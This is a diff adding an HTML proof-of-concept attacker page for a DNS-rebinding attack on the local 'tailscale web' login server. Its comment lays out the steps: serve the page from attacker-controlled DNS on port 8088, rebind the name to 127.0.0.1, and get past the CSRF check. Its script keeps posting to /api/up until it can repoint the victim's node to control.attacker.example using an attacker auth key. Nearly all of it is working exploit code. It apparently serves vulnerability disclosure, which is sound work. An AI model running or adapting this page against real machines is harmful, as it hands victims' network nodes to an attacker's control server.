@@ -1,0 +1,56 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>status</title>
+<!--
+  Attacker page for the DNS-rebinding -> /api/up repoint PoC.
+
+  Serve this from a host whose DNS you control (A record TTL ~1s), on the SAME
+  PORT the victim's `tailscale web` login server listens on (default 8088), e.g.
+  http://poc.attacker.example:8088/ .
+
+  Flow:
+   1. Victim (logged into their attacker-controlled lure) loads this page; the
+      browser caches attacker.example -> <attacker IP>.
+   2. After a few seconds you flip attacker.example's A record to 127.0.0.1
+      (DNS rebinding). The loop below keeps trying; once the browser re-resolves,
+      fetch('/api/up') is now SAME-ORIGIN with the victim's local tailscale web
+      (poc.attacker.example:8088), so csrfProtect passes and there is no Host
+      check in login mode.
+   3. /api/up repoints the (non-running) node to the attacker control server.
+
+  Works only while the victim node is NON-running (login state) -- the normal
+  state when someone runs `tailscale web` to log in.
+-->
+<pre id=log></pre>
+<script>
+const log = (m) => { document.getElementById('log').textContent += m + "\n"; };
+
+// Attacker-controlled coordination server + a pre-provisioned auth key on it.
+const ATTACKER_CONTROL = "https://control.attacker.example";
+const ATTACKER_AUTHKEY = "tskey-auth-REPLACE";
+
+async function attempt() {
+  try {
+    const r = await fetch("/api/up", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      // same-origin request; no cookies/session needed in login mode
+      body: JSON.stringify({
+        Reauthenticate: true,
+        ControlURL: ATTACKER_CONTROL,
+        AuthKey: ATTACKER_AUTHKEY
+      })
+    });
+    const t = await r.text();
+    log("POST /api/up -> HTTP " + r.status);
+    log(t.slice(0, 500));
+    if (r.ok) log("REPOINT SENT: node directed at " + ATTACKER_CONTROL);
+  } catch (e) {
+    // pre-rebind the fetch hits the attacker origin (cross) / fails; keep polling
+    log("retry… (" + e + ")");
+  }
+}
+// Poll until the DNS rebind to 127.0.0.1 takes effect.
+setInterval(attempt, 2000);
+attempt();
+</script>
